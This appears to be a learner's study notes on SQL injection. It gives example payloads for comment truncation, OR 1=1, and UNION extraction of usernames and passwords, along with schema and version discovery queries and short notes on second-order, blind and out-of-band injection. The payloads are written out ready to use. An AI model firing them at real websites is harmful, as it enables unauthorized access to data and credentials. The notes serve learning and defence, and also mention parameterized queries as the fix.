# *SQL injection occurs when user input is improperly included in a database query, allowing an attacker to manipulate the query logic and access unauthorized data*



# **Vulerabilities**
|  vulnerability | Example | How it looks in sql query|Meaning|
|---------|-------------|-------------|-------------|
|'--' |  https://insecure-website.com/products?category=Gifts'-- | 1) SELECT * FROM products WHERE category='Gifts' --' And released =1 | marks everything after -- as a comment  2) SELECT * FROM users WHERE username ='administrator' -- AND password='' |
|'+OR+1=1--' |  https://insecure-website.com/products?category=Gifts'+OR+1=1-- | SELECT * FROM products WHERE category='Gifts'OR 1=1 -- ' And released =1| 1=1 true and the rest is a comment,so even if I don't specifically know i want Gifts, * ( all categories) is given to me |
|'Union' |  https://insecure-website.com/products?category=Gifts'+UNION+Select+username,password+From+users-- | SELECT * FROM products WHERE Category='Gifts' UNION Select username,password From users--' | retreive other data from another table within the database |












Tools
|  Tool | What it does | Usefulness |
|---------|-------------|-------------|
|'SELECT * FROM v$version' |  Returns the Oracle database version details | useful for : knowing what syntax will work, what exploitation techniques are possible, what vulnerabilities might exist.|
|'SELECT * FROM information_schema.tables' |  Returns metadata about tables (table names, schemas, etc.) in MySQL/PostgreSQL. | useful for : Knowing what databases exist,what tables exist,what columns exist|





# 🧠 **Additional notes**
---

• You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query

---

• 'Second-Order SQL Injection(stored SQL injection) '- I store the malicious input in the database and the application later reuses that stored data in another SQL query without sanitizing it. (for example i register a username john' OR 1=1-- and then later the system builds a query like : SELECT * FROM users WHERE username = 'john' OR 1=1--')

---
• 'Blind SQL injection' - when the application does not return database errors or query results, but the attacker can infer information by observing differences in the application's behavior. Example: SELECT * FROM products  WHERE category = 'Gifts' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'

---
• 'OAST' - A testing technique where a payload causes the vulnerable system to make an external network request, allowing detection of vulnerabilities without relying on the application’s response. ( ex: after injecting code , I can’t tell if injection work as there's no channge in behaviour,no visible result etc..I  inject something that forces the server to request my domain- if in my server logs of my domain i see that website it means the vulnerability works)
